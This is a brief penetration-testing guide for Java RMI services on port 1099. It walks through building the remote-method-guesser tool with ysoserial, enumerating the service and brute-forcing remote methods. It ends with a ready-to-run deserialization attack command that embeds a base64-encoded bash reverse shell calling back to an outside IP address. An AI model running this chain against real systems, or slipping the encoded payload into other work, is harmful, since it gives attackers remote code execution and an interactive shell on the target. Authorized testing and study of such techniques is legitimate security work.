# Java Remote Management Interface (RMI) Penetration Testing

Port: 1099

Tools: 

https://github.com/qtc-de/remote-method-guesser

https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar

## Tools installation

### 1) Clone the rmg project and download ysoserial

    git clone https://github.com/qtc-de/remote-method-guesser
    wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar

### 2) Before building the tool, set your downloaded ysoserial-all.jar file path in the configuration file of the rmg tool as shown below

    nano remote-method-guesser/src/config.properties

Set the value of YSO variable to your ysoserial-all location

    YSO = /home/kaiser/Desktop/NetworkProtocols/ysoserial-all.jar

### 3) Build solution

    cd remote-method-guesser
    mvn package

## Usage

### 1) Enumerate potential low-hanging fruit vulnerabilities

    java -jar remote-method-guesser/target/rmi-5.1.0-jar-with-dependencies.jar enum TARGET_IP RMI_PORT

### 2) Brute force remote methods 

    java -jar remote-method-guesser/target/rmi-5.1.0-jar-with-dependencies.jar guess TARGET_IP RMI_PORT

### 3) Upon identifying remote methods, you can perform attacks to compromise the target.

Deserialization attack

    java -jar rmg-5.1.0-jar-with-dependencies.jar serial TARGET_IP RMI_PORT CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIzNy84MCAwPiYx}|{base64,-d}|{bash,-i}' --bound-name REGISTRY_BOUND_NAME --signature "GUESSED_METHOD"
